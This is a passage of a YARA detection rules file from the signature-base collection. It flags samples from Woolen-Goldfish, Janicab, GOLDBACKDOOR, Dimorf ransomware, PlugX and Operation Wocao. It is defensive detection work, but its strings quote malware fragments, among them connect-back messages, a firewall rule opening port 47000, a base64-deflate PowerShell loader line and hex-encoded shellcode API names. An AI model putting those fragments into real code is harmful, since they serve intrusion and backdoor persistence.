		hash2 = "62172eee1a4591bde2658175dd5b8652d5aead2a"
		hash3 = "7fef48e1303e40110798dfec929ad88f1ad4fbd8"
		hash4 = "c1edf6e3a271cf06030cc46cbd90074488c05564"

	strings:
		$s0 = "modules\\exploits\\littletools\\agent_wrapper\\release" ascii

	condition:
		all of them
}

rule SIGNATURE_BASE_Woolengoldfish_Generic_3
{
	meta:
		description = "Detects a operation Woolen-Goldfish sample - http://goo.gl/NpJpVZ"
		author = "Florian Roth (Nextron Systems)"
		id = "5c227d24-624c-5fb5-a2ea-a971fda8bfba"
		date = "2015-03-25"
		modified = "2023-12-05"
		reference = "http://goo.gl/NpJpVZ"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_woolengoldfish.yar#L81-L111"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "ac51c25ad6ef6668238fef1de50517d48e6509f57cd6dd723595777ae16d8a6c"
		score = 90
		quality = 83
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		hash1 = "86222ef166474e53f1eb6d7e6701713834e6fee7"
		hash2 = "e8dbcde49c7f760165ebb0cb3452e4f1c24981f5"

	strings:
		$x1 = "... get header FATAL ERROR !!!  %d bytes read > header_size" fullword ascii
		$x2 = "index.php?c=%S&r=%x&u=1&t=%S" fullword wide
		$x3 = "connect_back_tcp_channel#do_connect:: Error resolving connect back hostname" fullword ascii
		$s0 = "kernel32.dll GetProcAddressLoadLibraryAws2_32.dll" fullword ascii
		$s1 = "Content-Type: multipart/form-data; boundary=%S" fullword wide
		$s2 = "Attempting to unlock uninitialized lock!" fullword ascii
		$s4 = "unable to load kernel32.dll" fullword ascii
		$s5 = "index.php?c=%S&r=%x" fullword wide
		$s6 = "%s len:%d " fullword ascii
		$s7 = "Encountered error sending syscall response to client" fullword ascii
		$s9 = "/info.dat" fullword ascii
		$s10 = "Error entering thread lock" fullword ascii
		$s11 = "Error exiting thread lock" fullword ascii
		$s12 = "connect_back_tcp_channel_init:: socket() failed" fullword ascii

	condition:
		(1 of ( $x* ) ) or ( 8 of ( $s* ) )
}

rule SIGNATURE_BASE_SUSP_LNK_Smallscreensize
{
	meta:
		description = "check for LNKs that have a screen buffer size and WindowSize dimensions of 1x1"
		author = "Greg Lesnewich"
		id = "6194a76b-36d6-51d1-8d53-2e11172e29d2"
		date = "2023-01-01"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/gen_100days_of_yara_2023.yar#L22-L44"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "285985c21e34f8412b49dbfe04abad9f93af195801d0a8870ec3795b8a9a3787"
		score = 65
		quality = 85
		tags = ""
		version = "1.0"
		DaysofYARA = "1/100"

	strings:
		$dimensions = {02 00 00 A0 ?? 00 ?? ?? 01 00 01 00 01}

	condition:
		uint32be( 0x0 ) == 0x4c000000 and all of them
}

rule SIGNATURE_BASE_MAL_Janicab_LNK
{
	meta:
		description = "detect LNK files used in Janicab infection chain"
		author = "Greg Lesnewich"
		id = "c21844d3-eeee-530e-a69c-b7f604616f0b"
		date = "2023-01-01"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/gen_100days_of_yara_2023.yar#L46-L68"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "0c7e8427ee61672568983e51bf03e0bcf6f2e9c01d2524d82677b20264b23a3f"
		hash = "22ede766fba7551ad0b71ef568d0e5022378eadbdff55c4a02b42e63fcb3b17c"
		hash = "4920e6506ca557d486e6785cb5f7e4b0f4505709ffe8c30070909b040d3c3840"
		hash = "880607cc2da4c3213ea687dabd7707736a879cc5f2f1d4accf79821e4d24d870"
		hash = "f4610b65eba977b3d13eba5da0e38788a9e796a3e9775dd2b8e37b3085c2e1af"
		logic_hash = "f9c000ffb6a95d616459e00f0220ad26cb1df77e35582d14dfce1637ddfb466c"
		score = 75
		quality = 85
		tags = ""
		version = "1.0"
		DaysofYARA = "1/100"

	strings:
		$j_pdf1 = "%PDF-1.5" ascii wide
		$j_cmd = "\\Windows\\System32\\cmd.exe" ascii wide
		$j_pdf_stream = "endstream" ascii wide
		$j_pdb_obj = "endobj" ascii wide
		$dimensions = {02 00 00 A0 ?? 00 ?? ?? 01 00 01 00 01}

	condition:
		uint32be( 0x0 ) == 0x4C000000 and $dimensions and 2 of ( $j_* )
}

rule SIGNATURE_BASE_MAL_GOLDBACKDOOR_LNK
{
	meta:
		description = "No description has been set in the source file - Signature Base"
		author = "Greg Lesnewich"
		id = "9a80f875-4843-535c-9f2b-b04da55713b1"
		date = "2023-01-02"
		modified = "2023-12-05"
		reference = "https://stairwell.com/wp-content/uploads/2022/04/Stairwell-threat-report-The-ink-stained-trail-of-GOLDBACKDOOR.pdf"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/gen_100days_of_yara_2023.yar#L119-L142"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "120ca851663ef0ebef585d716c9e2ba67bd4870865160fec3b853156be1159c5"
		logic_hash = "043d01758c722964e848e51cf2747c5879f03f0fd43af827e2035abf113daf9d"
		score = 75
		quality = 85
		tags = ""
		version = "1.0"
		DaysofYARA = "2/100"

	strings:
		$doc_header = {D0 CF 11 E0 A1 B1 1A E1}
		$doc_icon_loc = "C:\\Program Files\\Microsoft Office\\Office16\\WINWORD.exe" ascii wide
		$script_apionedrivecom_hex_enc_str = "6170692e6f6e6564726976652e636f6d" wide
		$script_kernel32dll_hex_enc_str = "6b65726e656c33322e646c6c" wide
		$script_GlobalAlloc_hex_enc_str = "476c6f62616c416c6c6f63" wide
		$script_VirtualProtect_hex_enc_str = "5669727475616c50726f74656374" wide
		$script_WriteByte_hex_enc_str = "577269746542797465" wide
		$script_CreateThread_hex_enc_str = "437265617465546872656164" wide

	condition:
		uint32be( 0x0 ) == 0x4C000000 and 1 of ( $doc* ) and 2 of ( $script* )
}

rule SIGNATURE_BASE_MAL_PY_Dimorf
{
	meta:
		description = "Detection for Dimorf ransomeware"
		author = "Silas Cutler"
		id = "78b53433-6926-58cd-8ec0-2195af803aab"
		date = "2023-01-03"
		modified = "2023-12-05"
		reference = "https://github.com/Ort0x36/Dimorf"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/gen_100days_of_yara_2023.yar#L224-L242"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "7499b21f77d07364983b94134a60f7c99e71a5392386437d459a196bf71852fb"
		score = 75
		quality = 85
		tags = ""
		version = "1.0"

	strings:
		$func01 = "def find_and_encrypt"
		$func02 = "def check_os"
		$comment01 = "checks if the user has permission on the file."
		$misc01 = "log_dimorf.log"
		$misc02 = ".dimorf"

	condition:
		all of them
}

rule SIGNATURE_BASE_APT_Area1_SSF_Plugx
{
	meta:
		description = "Detects send tool used in phishing campaign reported by Area 1 in December 2018"
		author = "Area 1"
		id = "a5b4e781-f0d1-55df-926c-2d321aa48139"
		date = "2018-12-19"
		modified = "2023-12-05"
		reference = "https://cdn.area1security.com/reports/Area-1-Security-PhishingDiplomacy.pdf"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_area1_phishing_diplomacy.yar#L2-L27"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "a71f124f0c89c4b020f21d029d0d2997b2bea71526e83bcadffb67acc9cca8f7"
		score = 75
		quality = 85
		tags = ""

	strings:
		$feature_call = { 8b 0? 56 68 ?? ?? ?? ?? 68 ?? ?? ?? ?? 68 ?? ?? ?? ??
         6a 07 6a ff ff d0 8b f0 85 f6 74 14 }
		$keylogger_reg = { 8b 4d 08 6a 0c 6a 01 8d 55 f4 52 c7 45 f4 01 00 06 00
         c7 45 f8 00 01 00 00 89 4d fc ff d0 85 c0 75 1d }
		$file_op = { 55 8b ec 83 ec 20 0f b7 56 18 8b 46 10 66 8b 4e 14 89 45 e4
         8d 44 32 10 66 89 4d f0 0f b7 4e 1a 57 89 45 e8 33 ff 8d 45 e0 8d 54
         31 10 50 89 7d e0 89 55 ec c7 45 fa ?? ?? ?? ?? 89 7d f2 89 7d f6 ff
         15 1c 43 02 10 }
		$ver_cmp = { 0f b6 8d b0 fe ff ff 0f b6 95 b4 fe ff ff 66 c1 e1 08 0f b7
         c1 0b c2 3d 02 05 00 00 7f 2c }
		$regedit = { c7 06 23 01 12 20 c7 46 04 01 90 00 00 89 5e 0c 89 5e 08 e8
         51 fb ff ff 8b 4d 08 8b 50 38 68 30 75 00 00 56 51 ff d2 }
		$get_device_caps = { 8b 1d ?? ?? ?? ?? 6a 08 50 ff d3 0f b7 56 12 8b c8 0f af ca
         b8 1f 85 eb 51 f7 e9 c1 fa 05 8b c2 c1 e8 1f 03 c2 89 45 f8 8b 45 f0 6a 0a 50 ff d3
         0f b7 56 14 8b c8 0f af ca b8 1f 85 eb 51 }

	condition:
		3 of them
}

rule SIGNATURE_BASE_APT_MAL_CN_Wocao_Agent_Csharp
{
	meta:
		description = "Strings from CSharp version of Agent"
		author = "Fox-IT SRT"
		id = "e5212226-a82d-558d-abb4-43ad7848764e"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://www.fox-it.com/en/news/whitepapers/operation-wocao-shining-a-light-on-one-of-chinas-hidden-hacking-groups/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_op_wocao.yar#L2-L22"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "e77fcd2ac0c21db54563b15466962a775a5e8ef73cedb3af5cd00d5b0d615e4c"
		score = 75
		quality = 85
		tags = ""

	strings:
		$a = "mysend(client_sock, new byte[] { 0x16, 0x00 }, 2);" ascii wide
		$b = "Dns.GetHostAddresses(sip.Remove(sip.Length - 1));" ascii wide
		$c = "Port = 256 * buf[4] + buf[5];" ascii wide
		$d = "Port = 256 * buf[AddrLen] + buf[AddrLen + 1];" ascii wide
		$e = "StartTransData(CliSock" ascii wide
		$f = "static void ForwardTransmit(object ft_data)" ascii wide
		$key = "0x4c, 0x1b, 0x68, 0x0b, 0x6a, 0x18, 0x09, 0x41, 0x5a, 0x36, 0x1f, 0x56, 0x26, 0x2a, 0x03, 0x44, 0x7d, 0x5f, 0x03, 0x7b, 0x07, 0x6e, 0x03, 0x77, 0x30, 0x70, 0x52, 0x42, 0x53, 0x67, 0x0a, 0x2a" ascii wide
		$key_raw = { 4c1b680b6a1809415a361f56262a03447d5f037b076e03773070524253670a2a }

	condition:
		1 of them
}

rule SIGNATURE_BASE_APT_MAL_CN_Wocao_Agent_Powershell_B64Encoded
{
	meta:
		description = "Piece of Base64 encoded data from Agent CSharp version"
		author = "Fox-IT SRT"
		id = "14e1702d-6229-5989-8bb7-cc9c0c321676"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://www.fox-it.com/en/news/whitepapers/operation-wocao-shining-a-light-on-one-of-chinas-hidden-hacking-groups/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_op_wocao.yar#L40-L52"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "bcf9a75dbbf90044db76c56ffd07971d4252b0e75d73abf402ca4fadbfb59767"
		score = 75
		quality = 85
		tags = ""

	strings:
		$header = "LFNVT0hBBnVfVVJDSx0sU1VPSEEGdV9VUkNLCG9pHSxTVU9IQQZ1X1VSQ0sIZUlK"

	condition:
		all of them
}

rule SIGNATURE_BASE_APT_MAL_CN_Wocao_Agent_Py
{
	meta:
		description = "Strings from Python version of Agent"
		author = "Fox-IT SRT"
		id = "ca30dd6a-b596-54ab-b4f0-50e6b1382f73"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://www.fox-it.com/en/news/whitepapers/operation-wocao-shining-a-light-on-one-of-chinas-hidden-hacking-groups/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_op_wocao.yar#L54-L75"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "9b6eba750c96501aae1d86eef458d3e80de665efc7ce9d5aff842bc44363bad2"
		score = 75
		quality = 60
		tags = ""

	strings:
		$a = "vpshex.decode"
		$b = "self._newsock.recv"
		$c = "Rsock.connect"
		$d = /MAX_DATALEN\s?=\s?10240/
		$e = /LISTEN_MAXCOUNT\s?=\s?80/
		$f = "ListenSock.listen(LISTEN_MAXCOUNT)"
		$g = "nextsock.send(head)"
		$h = "elif transnode"
		$i = "infobuf[4:6]"
		$key = "L\\x1bh\\x0bj\\x18\\tAZ6\\x1fV&*\\x03D}_\\x03{\\x07n\\x03w0pRBSg\\n*"

	condition:
		1 of them
}

rule SIGNATURE_BASE_APT_MAL_CN_Wocao_Agent_Py_B64Encoded
{
	meta:
		description = "Piece of Base64 encoded data from Agent Python version"
		author = "Fox-IT SRT"
		id = "eb2701e9-4358-5d24-bfcd-b4dde24f13bf"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://www.fox-it.com/en/news/whitepapers/operation-wocao-shining-a-light-on-one-of-chinas-hidden-hacking-groups/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_op_wocao.yar#L77-L89"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "279fb27637d9b62b484283f778215d042de9fb83110a233e048452e921c540ee"
		score = 75
		quality = 85
		tags = ""

	strings:
		$header = "QlpoOTFBWSZTWWDdHjgABDTfgHwQe////z/v/9+////6YA4cGPsAl2e8M9LSU128"

	condition:
		all of them
}

rule SIGNATURE_BASE_APT_MAL_CN_Wocao_Keylogger_Py
{
	meta:
		description = "Strings from Python keylogger"
		author = "Fox-IT SRT"
		id = "f7b5ec1b-669e-5e7d-a9d3-011d212eb363"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://www.fox-it.com/en/news/whitepapers/operation-wocao-shining-a-light-on-one-of-chinas-hidden-hacking-groups/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_op_wocao.yar#L91-L107"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "2dc2ce153d559d795f302f5ca4a9ef9e6e5c54762472e38e6f4a26ef8a28a184"
		score = 75
		quality = 85
		tags = ""

	strings:
		$a = "c:\\windows\\temp\\tap.tmp"
		$b = "c:\\windows\\temp\\mrteeh.tmp"
		$c = "GenFileName"
		$d = "outfile"
		$e = "[PASTE:%d]"

	condition:
		3 of them
}

rule SIGNATURE_BASE_APT_MAL_CN_Wocao_Keylogger_File
{
	meta:
		description = "Rule for finding keylogger output files"
		author = "Fox-IT SRT"
		id = "22e866b3-4b02-593a-b9a6-aa86870b6509"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://www.fox-it.com/en/news/whitepapers/operation-wocao-shining-a-light-on-one-of-chinas-hidden-hacking-groups/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_op_wocao.yar#L109-L121"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "6d2d677b69eaf31843e8352bfe040c9e5a8d423d17900e022b769d28789f2d98"
		score = 75
		quality = 85
		tags = ""

	strings:
		$a = { 0d 0a 20 [3-10] 53 74 61 72 74 75 70 3a 20 [3] 20 [3] 20 [2] 20 [2] 3a [2] 3a [2] 20 }

	condition:
		all of them
}

rule SIGNATURE_BASE_APT_MAL_CN_Wocao_Xserver_Csharp
{
	meta:
		description = "Strings from the CSharp version of XServer"
		author = "Fox-IT SRT"
		id = "48f4c88d-fb56-54ca-84e2-38f88804a50f"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://www.fox-it.com/en/news/whitepapers/operation-wocao-shining-a-light-on-one-of-chinas-hidden-hacking-groups/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_op_wocao.yar#L123-L141"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "1201ee45df78cf3aec4b4bbb59cb7e4a70af6928895bb7c968ef02075a963405"
		score = 75
		quality = 85
		tags = ""

	strings:
		$a = "static void ServerX(int ListenPort)" ascii wide
		$b = "public class xserver" ascii wide
		$c = "[xserver]::Main($args);" ascii wide
		$d = "add rule name=powershell dir=in localport=47000 action=allow" ascii wide
		$e = "string TempFile = file_path + \".CT\";" ascii wide
		$f = "Port = 256 * RecvBuf[AddrLen + 5] + RecvBuf[AddrLen + 6];"
		$g = "CliSock.Send(new byte[] { 0x05, 0x00 });"

	condition:
		1 of them
}

rule SIGNATURE_BASE_APT_MAL_CN_Wocao_Xserver_Powershell_B64Encoded
{
	meta:
		description = "Piece of Base64 encoded data from the XServer PowerShell dropper"
		author = "Fox-IT SRT"
		id = "01e38cfb-b245-5398-b037-6d1d2fb726ee"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://www.fox-it.com/en/news/whitepapers/operation-wocao-shining-a-light-on-one-of-chinas-hidden-hacking-groups/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_op_wocao.yar#L143-L155"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "77315f0fc8387fa87892fc8fcea1f6e8a95560049aaa9a87519859020d0a7a3e"
		score = 75
		quality = 85
		tags = ""

	strings:
		$header_47000 = "5T39c9u2kr/nr2A0Ny2VKIzkfLRJntuJHafPN/nwWG777rUZDy3BNq8UqSEpx26b"
		$header_25667 = "5T1rc9u2st/zKxjNmZZKFEZyErdJ6nZsx+nxnTjxWGp77mkzHlqCbd5SpIak/Gjr"

	condition:
		any of them
}

rule SIGNATURE_BASE_APT_MAL_CN_Wocao_Xserver_Powershell_Dropper
{
	meta:
		description = "Strings from the PowerShell dropper of XServer"
		author = "Fox-IT SRT"
		id = "97169ab4-d68d-5137-83de-d9cac975747e"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://www.fox-it.com/en/news/whitepapers/operation-wocao-shining-a-light-on-one-of-chinas-hidden-hacking-groups/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_op_wocao.yar#L157-L168"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "640c9e52f3cf3df4e954177624e6fba4bab80a2c9442b718fe90e8577dafbbd6"
		score = 75
		quality = 85
		tags = ""

	strings:
		$encfile = "New-Object IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String($encfile)"

	condition:
		all of them
}

rule SIGNATURE_BASE_APT_MAL_CN_Wocao_Injector_Bin
{
	meta:
		description = "Process injector/launcher"
		author = "Fox-IT SRT"
		id = "389279f1-6531-594f-97b6-5adbc8fa4d3d"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://www.fox-it.com/en/news/whitepapers/operation-wocao-shining-a-light-on-one-of-chinas-hidden-hacking-groups/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_op_wocao.yar#L170-L193"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "c8cd4e3c87c6d80b39069f7a94e512e3f7b739c21f6fd70c2a79829c5a04f32f"
		score = 75
		quality = 85
		tags = ""

	strings:
		$a = "%s{%04d-%02d%02d-%02d%02d-%d%ld}.tmp"
		$b = "s% > s% c/ exe.d"
		$c = {
            48 89 5C 24 08 48 89 74  24 10 57 48 83 EC 50 48
            8B 71 08 48 8D 59 10 48  8B F9 48 8B CB FF 17 33
            C9 48 8D 47 78 48 89 44  24 48 4C 8D 87 9C 03 00
            00 48 89 5C 24 40 48 8D  97 90 00 00 00 4C 89 44
            24 38 45 33 C9 48 89 4C  24 30 45 33 C0 89 4C 24
            28 C7 44 24 20 01 00 00  00 66 89 4B 40 FF D6 48
            8B 5C 24 60 33 C0 48 8B  74 24 68 48 83 C4 50 5F
            C3
        }

	condition:
		1 of them
}

rule SIGNATURE_BASE_APT_MAL_CN_Wocao_Timeliner_Bin
{
	meta:
		description = "Timeliner utility"
		author = "Fox-IT SRT"
		id = "3d81a4ae-0ce0-5867-ac93-a706556481b6"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://www.fox-it.com/en/news/whitepapers/operation-wocao-shining-a-light-on-one-of-chinas-hidden-hacking-groups/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_op_wocao.yar#L195-L213"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "c3a8cddc34134faaab93ee0df0086604e4a7b031530dd65e2e8dab705483305b"
		score = 75
		quality = 85
		tags = ""

	strings:
		$a = "[+] Work completed." ascii wide
		$b = "[-] Create a new file failed." ascii wide
		$c = "[-] This is not a correct path." ascii wide
		$d = "%s [TargetPath] <Num> <SavePath>" ascii wide
		$e = "D\t%ld\t%ld\t%ld\t%d\t%d\t%s\t" ascii wide
		$f = "D\t%ld\t%ld\t%ld\t-1\t%d\t%s\t" ascii wide
		$g = "%s\t%ld\t%ld\t%ld\t%I64d\t%d\t%s\t%s" ascii wide

	condition:
		1 of them
}

rule SIGNATURE_BASE_APT_MAL_CN_Wocao_Checkadmin_Bin
{
	meta:
		description = "Checkadmin utility"
		author = "Fox-IT SRT"
		id = "2f819213-ade1-525b-af18-d77b7fc96093"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://www.fox-it.com/en/news/whitepapers/operation-wocao-shining-a-light-on-one-of-chinas-hidden-hacking-groups/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_op_wocao.yar#L215-L232"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "784ec960ce2733aebc404ee5c09bb852eb45553ad167db292d05b82feedbd5a6"
		score = 75
		quality = 85
		tags = ""

	strings:
		$a = "[-] %s * A system error has occurred: %d" ascii wide
		$b = {
            0D 00 0A 00 25 00 6C 00 64 00 20 00 72 00 65 00
            73 00 75 00 6C 00 74 00 73 00 2E 00 0D 00 0A 00
        }
		$c = "%s\t<Access denied>" ascii wide

	condition:
		1 of them
}

rule SIGNATURE_BASE_APT_MAL_CN_Wocao_Getos_Py
{
	meta:
		description = "Python getos utility"
		author = "Fox-IT SRT"
		id = "4a731dde-87e4-566a-b559-d23e0bef5841"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://www.fox-it.com/en/news/whitepapers/operation-wocao-shining-a-light-on-one-of-chinas-hidden-hacking-groups/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_op_wocao.yar#L234-L295"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "2535c01b703c0fcba43e771832db8cd969e4a4b112ef28e4ddfeac6491ba604c"
		score = 75
		quality = 85
		tags = ""

	strings:
		$smb_1 = {
            00 00 00 85 ff 53 4d 42 72 00 00 00 00 18 53 c8
            00 00 00 00 00 00 00 00 00 00 00 00 00 00 ff fe
            00 00 ff b4 00 62 00 02 50 43 20 4e 45 54 57 4f
            52 4b 20 50 52 4f 47 52 41 4d 20 31 2e 30 00 02
            4c 41 4e 4d 41 4e 31 2e 30 00 02 57 69 6e 64 6f
            77 73 20 66 6f 72 20 57 6f 72 6b 67 72 6f 75 70
            73 20 33 2e 31 61 00 02 4c 4d 31 2e 32 58 30 30
            32 00 02 4c 41 4e 4d 41 4e 32 2e 31 00 02 4e 54
            20 4c 4d 20 30 2e 31 32 00
        }
		$smb_2 = {
            00 00 00 c8 ff 53 4d 42 73 00 00 00 00 18 03 c8
            00 00 00 00 00 00 00 00 00 00 00 00 00 00 ff fe
            00 00 3f b5 0c ff 00 c8 00 04 11 32 00 00 00 00
            00 00 00 28 00 00 00 00 00 d4 00 00 a0 8d 00 4e
            54 4c 4d 53 53 50 00 01 00 00 00 07 82 88 a2 00
            00 00 00 28 00 00 00 00 00 00 00 28 00 00 00 05
            01 28 0a 00 00 00 0f 00 00 00 00 00 00 00 00 00
            00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
            00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
            00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
            00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
            00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
            00 00 00 00 00 00 00 00 00 00 00 00
        }
		$smbstr_1 = "\\x00\\x00\\x00\\x85\\xffSMBr\\x00\\x00\\x00\\x00\\x18S\\xc8\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xff\\xfe\\x00\\x00\\xff\\xb4\\x00b\\x00\\x02PC NETWORK PROGRAM 1.0\\x00\\x02LANMAN1.0\\x00\\x02Windows for Workgroups 3.1a\\x00\\x02LM1.2X002\\x00\\x02LANMAN2.1\\x00\\x02NT LM 0.12\\x00"
		$smbstr_2 = "\\x00\\x00\\x00\\xc8\\xffSMBs\\x00\\x00\\x00\\x00\\x18\\x03\\xc8\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xff\\xfe\\x00\\x00?\\xb5\\x0c\\xff\\x00\\xc8\\x00\\x04\\x112\\x00\\x00\\x00\\x00\\x00\\x00\\x00(\\x00\\x00\\x00\\x00\\x00\\xd4\\x00\\x00\\xa0\\x8d\\x00NTLMSSP\\x00\\x01\\x00\\x00\\x00\\x07\\x82\\x88\\xa2\\x00\\x00\\x00\\x00(\\x00\\x00\\x00\\x00\\x00\\x00\\x00(\\x00\\x00\\x00\\x05\\x01(\\n\\x00\\x00\\x00\\x0f\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00"
		$code_1 = "return 'Other error.'" ascii wide
		$code_2 = "sblob = buf[47:47 + sbl]" ascii wide
		$code_3 = "re.split('[\\x00-,]+', y[-4])" ascii wide
		$code_4 = "('').join(sblob[off:off + hlen].split('\\x00'))" ascii wide
		$code_5 = "banner = '%s    %s' % (hostname, native)" ascii wide
		$code_6 = "banner = '%s\\\\%s    %s' % (dm, hostname, native)" ascii wide
		$tsk_1 = "PushTask" ascii wide
		$tsk_2 = "parse_task" ascii wide
		$tsk_3 = "commit_task" ascii wide
		$str_1 = "Usage: getos.py <ip-range|ip-file>" ascii wide
		$str_2 = "The path '%s' write fails." ascii wide
		$str_3 = "Receive a signal %d," ascii wide
		$str_4 = "Scan Complete!" ascii wide
		$str_5 = "line: %d, %s: %s" ascii wide
		$str_6 = "Other error." ascii wide

	condition:
		( all of ( $smb_* ) ) or ( all of ( $smbstr_* ) ) or ( 3 of ( $code_* ) ) or ( all of ( $tsk_* ) ) or ( 3 of ( $str_* ) )
}

rule SIGNATURE_BASE_APT_MAL_CN_Wocao_Info_Vbs
{
	meta:
		description = "Strings from the information grabber VBS"
		author = "Fox-IT SRT"
		id = "b719fb31-2836-5faf-a7c8-c361a14df2be"
		date = "2023-12-05"
		modified = "2023-12-05"
